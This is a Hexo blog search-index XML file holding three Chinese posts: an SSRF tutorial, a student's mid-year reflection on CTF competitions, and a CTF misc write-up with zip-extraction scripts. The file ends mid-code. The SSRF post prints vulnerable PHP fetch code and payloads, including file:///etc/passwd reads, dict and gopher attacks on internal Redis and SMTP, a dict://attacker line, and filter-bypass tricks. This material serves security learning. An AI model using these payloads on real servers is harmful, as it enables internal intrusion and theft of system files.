<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>114514分钟能了解SSRF吗</title>
    <url>/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/</url>
    <content><![CDATA[<h1 id="♿1919810分钟能了解SSRF吗♿"><a href="#♿1919810分钟能了解SSRF吗♿" class="headerlink" title="♿1919810分钟能了解SSRF吗♿"></a>♿1919810分钟能了解SSRF吗♿</h1><p>冲刺♿，冲刺♿，冲♿</p>
<h2 id="SSRF是扫码"><a href="#SSRF是扫码" class="headerlink" title="SSRF是扫码"></a>SSRF是扫码</h2><p>SSRF，全称<strong>Server-Side Request Forgery，服务器端请求伪造</strong></p>
<p>关键词是<code>ip</code></p>
<p>通过用户输入包含URL的功能&#x2F;请求参数包含外部资源应用来触发s</p>
<p>说白了就是通过一些方式偷偷的摸进内网视奸</p>
<p>目前有记载的主流的在PHP</p>
<p>说实话其实只要涉及对内网的文件有读取(从自身发起请求)，过滤又不充分的都会触发这个漏洞的</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><pre><code class="highlight php"><span class="title function_ invoke__">file_get_contents</span>()
<span class="title function_ invoke__">fsockopen</span>()
<span class="title function_ invoke__">curl_exec</span>()
<span class="title function_ invoke__">fopen</span>()
<span class="title function_ invoke__">readfile</span>()</code></pre>

<p>先讲第一个</p>
<ul>
<li><code>file_get_contents()</code></li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;
<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
<span class="meta">?&gt;</span></code></pre>

<p>从url这个参数里获取内容，并指定一个文件名进行保存</p>
<p>而<code>file_put_contents</code>是把字符串写入文件当中</p>
<ul>
<li><code>fsockopen()</code></li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> 
<span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; 
    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); 
    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; 
        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; 
    &#125; <span class="keyword">else</span> &#123; 
        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; 
        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); 
        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; 
        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; 
            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); 
        &#125; 
        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); 
        <span class="keyword">return</span> <span class="variable">$contents</span>; 
    &#125; 
&#125;
<span class="meta">?&gt;</span></code></pre>

<p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
<ul>
<li><code>curl_exec()</code></li>
</ul>
<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> 
<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;
    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);
    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);

    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;
    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); 
    <span class="keyword">echo</span> <span class="variable">$result</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p><code>curl_exec</code>函数用于执行指定的cURL会话</p>
<ul>
<li><code>fopen()</code></li>
<li><code>readfile()</code></li>
</ul>
<blockquote>
<p>[!CAUTION]</p>
</blockquote>
<pre><code class="highlight plaintext">1.一般情况下PHP不会开启fopen的gopher wrapper
2.file_get_contents的gopher协议不能URL编码
3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
5.curl_exec() //默认不跟踪跳转，
6.file_get_contents() // file_get_contents支持php://input协议</code></pre>

<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>对python的SSRF不太熟悉，故这里引用大佬的一些内容</p>
<p>在Python中，常用的函数有urllib(urllib2)和requests库。以urllib(urllib2)为例， urllib并不支持gopher,dict协议，所以按照常理来讲ssrf在python中的危害也应该不大，但是当SSRF遇到CRLF，奇妙的事情就发生了。</p>
<p>urllib曾爆出CVE-2019-9740、CVE-2019-9947两个漏洞，这两个漏洞都是urllib(urllib2)的CRLF漏洞，只是触发点不一样，其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3之间，目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。其实之前还有一个CVE-2016-5699，同样的urllib（urllib2）的CRLF问题，但是由于时间比较早，影响范围没有这两个大，这里也不再赘叙</p>
<p>python2代码如下：</p>
<pre><code class="highlight plaintext">import sysimport urllib2host = &quot;127.0.0.1:7777?a=1 HTTP/1.1\r\nCRLF-injection: test\r\nTEST: 123&quot;url = &quot;http://&quot;+ host + &quot;:8080/test/?test=a&quot;try:  info = urllib2.urlopen(url).info()  print(info)except Exception as e:print(e)</code></pre>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>一般利用需要以下协议</p>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>有回显的情况下可以打，读取任意内容</p>
<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
<pre><code class="highlight plaintext">http://test.org/ssrf.php?url=dict://127.0.0.1:6379/info  //查看reids相关配置

如果ssrf.php中加上一行屏蔽回显的代码“curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);”，那么这种方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据了。</code></pre>

<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell.</p>
<p>gopher包构造方法</p>
<p><strong>GET包</strong></p>
<pre><code class="highlight plaintext">截取第一行和第二行(全部url编码并且+_)
GET ......
Host ......</code></pre>

<p>实例:</p>
<pre><code class="highlight plaintext">GET /testg.php?name=xxx HTTP/1.1
Host: 10.211.55.2
可以构造为
_%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a

一定要手工补上换行%0d%0a</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250505140956343.png" alt="image-20250505140956343"></p>
<p><strong>POST包</strong></p>
<pre><code class="highlight plaintext">截取以下部分
POST ....
Host ....
Content-Type: application/x-www-form-urlencoded
Content-Length: i</code></pre>



<h3 id="http-s"><a href="#http-s" class="headerlink" title="http&#x2F;s"></a>http&#x2F;s</h3><p>探测内网主机存活</p>
<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用:"></a>本地利用:</h3><p>（1）使用file协议 file protocol (任意文件读取)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=file:///etc/passwd&quot;</code></pre>

<p>（2）使用dict协议 dict protocol (获取Redis配置信息)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=dict://127.0.0.1:6379/info&quot;</code></pre>

<p>（3）使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=gopher://127.0.0.1:6379/_*1 %0d %0a $8%0d %0aflushall %0d %0a*3 %0d %0a $3%0d</code></pre>

<h3 id="检测端口情况"><a href="#检测端口情况" class="headerlink" title="检测端口情况"></a>检测端口情况</h3><pre><code class="highlight plaintext">3306： MySQL
443：tcp
8080：TCP服务端默认端口、JBOSS、TOMCAT、Oracle XDB（XML 数据库）
6379：Redis数据库端口</code></pre>



<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>一般URL上会出现关键字类似于</p>
<pre><code class="highlight plaintext">Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code></pre>

<h3 id="排除法"><a href="#排除法" class="headerlink" title="排除法"></a>排除法</h3><p>浏览器f12查看源代码看是否是在本地进行了请求</p>
<p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
<h3 id="dnslog等工具进行测试"><a href="#dnslog等工具进行测试" class="headerlink" title="dnslog等工具进行测试"></a>dnslog等工具进行测试</h3><p>看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p>
<h3 id="分析请求的发起端"><a href="#分析请求的发起端" class="headerlink" title="分析请求的发起端"></a>分析请求的发起端</h3><p>抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p>
<ul>
<li>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</li>
<li>通过二级域名暴力猜解工具模糊猜测内网地址</li>
<li>通过file协议读取内网信息获取相关地址</li>
</ul>
<h3 id="留意返回信息"><a href="#留意返回信息" class="headerlink" title="留意返回信息"></a>留意返回信息</h3><p>直接返回的Banner、title、content等信息</p>
<h3 id="留意布尔型SSRF"><a href="#留意布尔型SSRF" class="headerlink" title="留意布尔型SSRF"></a>留意布尔型SSRF</h3><p>通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p>
<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="任意指向-xip-io"><a href="#任意指向-xip-io" class="headerlink" title="任意指向(xip.io)"></a>任意指向(xip.io)</h3><pre><code class="highlight plaintext">http://127.0.0.1.xip.io/==&gt;http://127.0.0.1/</code></pre>

<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用[::]"></a>利用[::]</h3><pre><code class="highlight plaintext">利用[::]绕过localhost 
http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre>

<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用@"></a>利用@</h3><pre><code class="highlight plaintext">http://example.com@127.0.0.1</code></pre>

<h3 id="利用短链接"><a href="#利用短链接" class="headerlink" title="利用短链接"></a>利用短链接</h3><pre><code class="highlight plaintext">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1
http://sudo.cc &gt;&gt;&gt;http://127.0.0.1</code></pre>

<h3 id="修改类型"><a href="#修改类型" class="headerlink" title="修改类型"></a>修改类型</h3><pre><code class="highlight plaintext">修改&quot;type=file&quot;为&quot;type=url&quot;
比如：
上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</code></pre>

<h3 id="利用Enclosed-alphanumerics"><a href="#利用Enclosed-alphanumerics" class="headerlink" title="利用Enclosed alphanumerics"></a>利用Enclosed alphanumerics</h3><pre><code class="highlight plaintext">利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre>

<h3 id="利用句号"><a href="#利用句号" class="headerlink" title="利用句号"></a>利用句号</h3><pre><code class="highlight plaintext">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre>

<h3 id="利用进制转换"><a href="#利用进制转换" class="headerlink" title="利用进制转换"></a>利用进制转换</h3><pre><code class="highlight plaintext">例如192.168.0.1
C0 A8 00 01
8 进制格式：0300.0250.0.1
16 进制格式：0xC0.0xA8.0.1
10 进制整数格式：3232235521
16 进制整数格式：0xC0A80001
还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1

127.0.0.1=&gt;7F 00 00 01
可以是十六进制，八进制等。
115.239.210.26  &gt;&gt;&gt;  16373751032
首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
然后把 73efd21a 这十六进制一起转换成8进制
记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</code></pre>

<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><pre><code class="highlight plaintext">Dict://
dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;
ssrf.php?url=dict://attacker:11111/
SFTP://
ssrf.php?url=sftp://example.com:11111/
TFTP://
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher://
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</code></pre>



]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>2025年中总结</title>
    <url>/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="凑新手-捐购-的年中总结"><a href="#凑新手-捐购-的年中总结" class="headerlink" title="凑新手(捐购)的年中总结"></a>凑新手(捐购)的年中总结</h1><p>刚考完狗史期末考试的下午，想着这个学期也结束了<br>感觉期末周忙了和没忙一样啊，也学不到东西。。。只是为了应付考试和那该死的保研名额(为了争这个也是被卷的不行哈哈…然后也发现和别人无意义的互怼内卷貌似也没啥意义，太累了)<br>当然考试周不能说是没有收获，毕竟这两周还是有点曲折哈哈。<br>先简单的回顾下上半年做了什么吧</p>
<h2 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h2><p>没记错的话那个时候也是期末周来着，那个时候还是很有动力去准备期末考的，现在看来发现不知道在燃什么。。<br>之后是软件赛的初赛。<br><strong>爆零了</strong><br>当了一把<code>town in go</code>，当时就在想自己怎么这么菜，虽然现在也是这么想的。那个时候貌似是刚开始从<code>misc</code>转型<code>web</code>来着，也想过自己会不会转型失败直接和ctf拜拜，但是太好了，转型还算成功，和考试相比，还是<code>ctf</code>更好玩<del>等又爆零了你就不说话了</del><br>那个时候写了个计划，可惜到寒假结束我都没有完成它(<br>还顺带打了个春秋杯冬季赛，狠狠吃<code>misc</code>老底</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250622155910679.png" alt="image-20250622155910679"></p>
<h2 id="二月"><a href="#二月" class="headerlink" title="二月"></a>二月</h2><p>二月印象最深的大概是，第一次参加非新生赛，<strong>VNCTF</strong><br>也是吃<code>misc</code>老底。<del>我吗?公开赛打还没入门的方向?真的假的?</del><br>后面就回去开学了，后面忘了。。</p>
<p>o ,还有HGAME,只做了w1好像，谜语人题目w2就没去做了说是</p>
<h2 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h2><p>这个时候大概是在边焦虑边准备校赛吧。好害怕自己被天赋哥干爆了。去参加老登组织的培训七七八八(前面忘了，后面忘了，只记得被c3盒了)<br>最倒霉的是月末，手机被下水道俘获了，忍痛换一个新的，从此寝室厕所里多了一条凳子。(<code>rz</code>学校厕所配置不统一)</p>
<p>(纪念一下我死去的手机，陪了主包三年没想到折在这种地方了唉唉)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a8ce2a9b3ae7cd283f921e82f02ac146_720.jpg" alt="a8ce2a9b3ae7cd283f921e82f02ac146_720"></p>
<h2 id="四月"><a href="#四月" class="headerlink" title="四月"></a>四月</h2><p>月初是校赛来着，虽然压力很大，但是最后顶住压力靠运气好拿了第</p>
<p>二，但是其实开赛30分钟内我都是紧张得无法解题。还是太嫩了哈哈。。感觉以后当老赛棍了会好点，还是成功进队了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2f37f17af40646f54c57f09d6628bfe3.jpg" alt="2f37f17af40646f54c57f09d6628bfe3">后来打了杭师的<code>GHCTF</code>，我草怎么被还没进队的单杀了。?<br>故忏悔。</p>
<h2 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h2><p>五一?拿来吧你，<code>miniCTF</code>来咯！(乐</p>
<p>第二次打公开赛(应该算公开赛吧)</p>
<p>反应belike:<code>misc</code>怎么那么多长的像web的，<code>web</code>这怎么都是前端，wc怎么他们都会，又被另一个同年级的<code>web</code>手拷打了。</p>
<p>最后还是靠着老登上号发力了打上去。</p>
<p>我,再忏悔。</p>
<h2 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h2><p>纱布期末周，期末周前还有一个<code>LitCTF</code>，学长说让我<code>ak</code>，我六缺2，剩下的一个是弱密码，一个是反序列化，菜菜菜菜菜菜<br>抱憾去参加期末考，更抱憾了<del>吊学校考试排的什么日程吃柠檬</del></p>
<p>考了一半数据结构成绩出来发现8开头天都塌了，保你码研保，不保了(</p>
<p>再再忏悔。？忏你吗悔，没啥软用啊我看。</p>
<p>感觉要重新磨砺一下自己的集中力和意志力了。不然感觉会在水群中迷失了方向啊。。</p>
<p>想做技术型主包来着()</p>
<p>当然在考试的过程中也考虑过卷这个问题，好想卷过，但是日防夜放放到现在，发现还是卷不过。也过郁郁不得志的时候，感觉好像带学和自己想象的不一样，感觉失去乐趣了。但是最后在朋友的帮助下还是重拾了信心，大二给他们来个大的(希望如此，并非开玩笑。)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2fedb402d4e9ac66330c6287e44b72c6_720.jpg" alt="2fedb402d4e9ac66330c6287e44b72c6_720"></p>
<p>就复盘到这里吧，明天还有课程设计来着，啥比学校花活还真是有点多啊我看。明明期末考考完了还迟迟不肯放学生走吗(虽然要集训我本身就走不了哈哈。</p>
]]></content>
      <tags>
        <tag>-总结</tag>
      </tags>
  </entry>
  <entry>
    <title>2025春秋杯冬季赛</title>
    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
<p>听C3师傅说这还不算是上强度的</p>
<p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p>
<p>还是要多练，下次努力不啃Misc老底</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p>
<p>解析得到</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
<h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> re
zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
<span class="keyword">while</span> <span class="literal">True</span>:
    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
        ts1 = zipfile.ZipFile(zipname)
        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
    <span class="keyword">else</span>:
        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>

<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> os
<span class="keyword">import</span> base64

<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password
<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
    <span class="keyword">try</span>:
        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
            zf.extractall(path=extract_to, pwd=password.encode())
            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
            <span class="keyword">return</span> zf.namelist()  
    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
        <span class="keyword">return</span> []
<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
    current_number = start_number
    <span class="keyword">while</span> <span class="literal">True</span>:
        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        password = decode_password(password_filename)
        extracted_files = extract_zip(zip_filename, password,parent_dir)
        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
            <span class="keyword">break</span>
        next_zip_file = <span class="literal">None</span>
        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
                next_zip_file = extracted_file
                <span class="keyword">break</span>
        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
            <span class="keyword">break</span>
        current_number -= <span class="number">1</span>
<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    recursive_extract()</code></pre>

<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
<p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> base64


<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password

